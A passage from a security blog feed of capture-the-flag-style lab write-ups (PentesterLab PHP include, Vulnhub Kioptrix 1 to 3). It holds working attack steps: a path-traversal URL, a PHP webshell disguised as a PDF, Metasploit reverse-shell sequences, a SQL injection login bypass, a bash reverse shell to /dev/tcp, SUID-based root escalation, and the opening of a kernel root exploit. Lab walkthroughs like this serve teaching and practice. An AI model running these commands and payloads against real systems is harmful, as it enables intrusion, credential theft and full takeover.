<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Lets confirm it:</p>

<p><code>http://192.168.79.188/index.php?page=fgfgfgf</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p><code>http://192.168.79.188/index.php?page=../../../../../../../../../../etc/passwd%00</code></p>

<p>(the reason why add %00 after /etc/passwd is php code will ad a suffix .php, so that we have to add a Null byte to get rid of it)</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>I tried to exploit remote file inclide:</p>

<p><code>http://192.168.79.188/index.php?page=http://192.168.79.173/webshell.txt&amp;cmd=ifconfig</code></p>

<p>Doesn&rsquo;t work.</p>

<p>Exam the webpage, I find that I can upload pdf file to the server. I tried just rename webshell.txt to webshell.pdf and the server doesn&rsquo;t accpet it. I guess the server will valid the pdf file format. So I create a craft pdf file:</p>

<figure class='code'><figcaption><span>webshell.pdf</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">%</span><span class="nx">PDF</span><span class="o">-</span><span class="mf">1.4</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Upload it. Works.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now try to visit after log in.</p>

<p>Try to verify the webshell:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>looks good</p>

<p>set up netcat listener on my kali and run the command on server:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>and get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/phpinclude/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub-Kioptrix Level 3]]></title>
    <link href="http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3/"/>
    <updated>2016-06-09T11:42:38-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>Metasploit</li>
<li>Wfuzz</li>
<li>Hashcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.184 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.184 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Ports 22 and 80 are opening.</p>

<p>Now use Nikto to scan:</p>

<p><code>nikto -h 192.168.79.184</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Nothing excited.</p>

<p>Now lets browser the web page in the target.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Find the target may use LotusCMS.</p>

<p>In msfconsole:</p>

<p><code>search LotusCMS</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>find one exploit</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/lcms_php_exec 
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set rhost 192.168.79.184
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set uri 
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set payload php/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(lcms_php_exec) &gt; set lhost 192.168.79.173
</span><span class='line'>exploit</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Got the shell, next step is try to get root.</p>

<p>In this step, I tried to enumeration all kinds of shit and use serveral vernerable kernel exploits to get the root but failed. During the emumeration. I found a ffile gconfig.php is interesting. Then I found that:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>maybe the  username/password for ssh, but no. Thats too easy.</p>

<p>So that I go back to use wfuzz the scan the http services.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it has phpmyadmin. Try that:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>Log in using the username/password that just found. Successed.</p>

<p>review the content, found this:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>now found two users and the hashed passwords:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Copy the passwords to a file use hashcat to crack it:</p>

<p><code>hashcat hash.txt /user/share/wordlists/rockyou.txt</code></p>

<p>get both passwords:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>ssh to the target, search the SUID binaries:</p>

<p><code>find / -perm +6000 -type f -exec ls -ld {} \;</code></p>

<p>found an interesting file /uss/local/bin/ht, I googled it and found it is a hex editor.</p>

<p>now try to use it to open /etc/sudoers file, get error message. to fix it:</p>

<p><code>export TERM=xterm</code></p>

<p>change the loneferret permission:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>get the root</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix3/Selection_021.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub-Kioptrix Level 2]]></title>
    <link href="http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2/"/>
    <updated>2016-06-07T15:56:48-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/07/vulhub-kioptrix2</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>zap</li>
<li>netcat</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.183 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.183 -p-</code></p>

<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-07 16:07 CDT
</span><span class='line'>NSE: Loaded 138 scripts for scanning.
</span><span class='line'>NSE: Script Pre-scanning.
</span><span class='line'>Initiating NSE at 16:07
</span><span class='line'>Completed NSE at 16:07, 0.00s elapsed
</span><span class='line'>Initiating NSE at 16:07
</span><span class='line'>Completed NSE at 16:07, 0.00s elapsed
</span><span class='line'>Initiating ARP Ping Scan at 16:07
</span><span class='line'>Scanning 192.168.79.183 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 16:07, 0.00s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 16:07
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 16:08, 13.00s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 16:08
</span><span class='line'>Scanning 192.168.79.183 [65535 ports]
</span><span class='line'>Discovered open port 443/tcp on 192.168.79.183
</span><span class='line'>Discovered open port 3306/tcp on 192.168.79.183
</span><span class='line'>Discovered open port 111/tcp on 192.168.79.183
</span><span class='line'>Discovered open port 22/tcp on 192.168.79.183
</span><span class='line'>Discovered open port 80/tcp on 192.168.79.183
</span><span class='line'>Discovered open port 666/tcp on 192.168.79.183
</span><span class='line'>Discovered open port 631/tcp on 192.168.79.183
</span><span class='line'>Completed SYN Stealth Scan at 16:08, 3.99s elapsed (65535 total ports)
</span><span class='line'>Initiating Service scan at 16:08
</span><span class='line'>Scanning 7 services on 192.168.79.183
</span><span class='line'>Completed Service scan at 16:08, 16.01s elapsed (7 services on 1 host)
</span><span class='line'>Initiating OS detection (try #1) against 192.168.79.183
</span><span class='line'>NSE: Script scanning 192.168.79.183.
</span><span class='line'>Initiating NSE at 16:08
</span><span class='line'>Completed NSE at 16:08, 2.14s elapsed
</span><span class='line'>Initiating NSE at 16:08
</span><span class='line'>Completed NSE at 16:08, 0.00s elapsed
</span><span class='line'>Nmap scan report for 192.168.79.183
</span><span class='line'>Host is up (0.00052s latency).
</span><span class='line'>Not shown: 65528 closed ports
</span><span class='line'>PORT     STATE SERVICE  VERSION
</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
</span><span class='line'>|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
</span><span class='line'>|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
</span><span class='line'>|_sshv1: Server supports SSHv1
</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.0.52 (CentOS)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1            663/udp  status
</span><span class='line'>|_  100024  1            666/tcp  status
</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|_http-server-header: Apache/2.0.52 (CentOS)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</span><span class='line'>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
</span><span class='line'>| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
</span><span class='line'>| Public Key type: rsa
</span><span class='line'>| Public Key bits: 1024
</span><span class='line'>| Signature Algorithm: md5WithRSAEncryption
</span><span class='line'>| Not valid before: 2009-10-08T00:10:47
</span><span class='line'>| Not valid after:  2010-10-08T00:10:47
</span><span class='line'>| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
</span><span class='line'>|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
</span><span class='line'>|_ssl-date: 2016-06-07T17:59:07+00:00; -3h09m26s from scanner time.
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
</span><span class='line'>| http-methods: 
</span><span class='line'>|   Supported Methods: GET HEAD OPTIONS POST PUT
</span><span class='line'>|_  Potentially risky methods: PUT
</span><span class='line'>|_http-server-header: CUPS/1.1
</span><span class='line'>|_http-title: 403 Forbidden
</span><span class='line'>666/tcp  open  status   1 (RPC #100024)
</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
</span><span class='line'>MAC Address: 00:0C:29:55:D2:EE (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.6.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
</span><span class='line'>OS details: Linux 2.6.9 - 2.6.30
</span><span class='line'>Uptime guess: 0.018 days (since Tue Jun  7 15:42:38 2016)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>TCP Sequence Prediction: Difficulty=201 (Good luck!)
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.52 ms 192.168.79.183
</span><span class='line'>
</span><span class='line'>NSE: Script Post-scanning.
</span><span class='line'>Initiating NSE at 16:08
</span><span class='line'>Completed NSE at 16:08, 0.00s elapsed
</span><span class='line'>Initiating NSE at 16:08
</span><span class='line'>Completed NSE at 16:08, 0.00s elapsed
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
</span><span class='line'>           Raw packets sent: 65555 (2.885MB) | Rcvd: 65551 (2.623MB)
</span></code></pre></td></tr></table></div></figure>


<p>Use Nikto to scan  the web service.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>not so excited.</p>

<p>check the webpage:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>may contain SQL injection. Use zap to scan:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Finally try username as <code>test</code>, password <code>test' or '1'=1'</code> can bypass the login.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Now I am looking for command injection:</p>

<p>try:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Okay. Now set up netcat on port 4444 and in the web console:</p>

<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>

<p>get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>But not the root. Keep going&hellip;</p>

<p>After enumeration, I found the kernel version is 2.6.9. Now search the exploit</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Find an interestig one. I tried other exploits too, but failed..</p>

<p>Upload it to the target, compile and run it. ROOT:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulhub-Kioptrix level 1]]></title>
    <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
    <updated>2016-06-06T09:21:18-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>nbtscab</li>
<li>enum4linux</li>
<li>Metasploit</li>
<li>Nikto</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.182 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.182 -p-</code></p>

<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>SMB Attack:</p>

<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>

<p><code>nbtscan 192.168.79.182</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use enum4linux to enumerate smb:</p>

<p><code>enum4linux  -a 192.168.79.182</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>get the samba version</p>

<p>Now start Metasploit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfconsole
</span><span class='line'>search samba
</span><span class='line'>use exploit/linux/samba/trans2open
</span><span class='line'>set rhost 192.168.79.182
</span><span class='line'>set payload generic/shell_reverse_tcp
</span><span class='line'>exploit
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE SMB</p>

<p>mod_ssl exploit:</p>

<p>use nikto to scan:</p>

<p><code>nikto -h 192.168.79.182</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like mod_ssl is vulnerable</p>

<p>search exploits:</p>

<p><code>searchexploit openssl</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>now try to compile the c code. Get error. Find a <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">blog</a> to fix it.</p>

<p>now recompile:</p>

<p><code>
gcc 764.c -o 764 -lcrypto
</code></p>

<p>run the 764 and it requires to input id for the target&rsquo;s supported box eg: 0x00. In the result of nikto, the box is Apache/1.3.20 (Unix)  (Red-Hat/Linux)</p>

<p>so I can just:</p>

<p><code>./764 -h |grep 1.3.20</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>so we can just 0x6a and 0x0b. Finially got 0x0b works</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/kioptrix1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>I get the shell, but still not get the root. After analysis, I figure it out that code 764.c download ptrace-kmod.c. compile and execute it. I didn&rsquo;t connect my vm to Internet, so it failed when it tried to download the code. Finally I get the ptrace-kmod.c</p>

<figure class='code'><figcaption><span>ptrace-kmod.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Linux kernel ptrace/kmod local root exploit</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * This code exploits a race condition in kernel/kmod.c, which creates</span>
</span><span class='line'><span class="cm"> * kernel thread in insecure manner. This bug allows to ptrace cloned</span>
</span><span class='line'><span class="cm"> * process, allowing to take control over privileged modprobe binary.</span>
</span><span class='line'><span class="cm"> *</span>
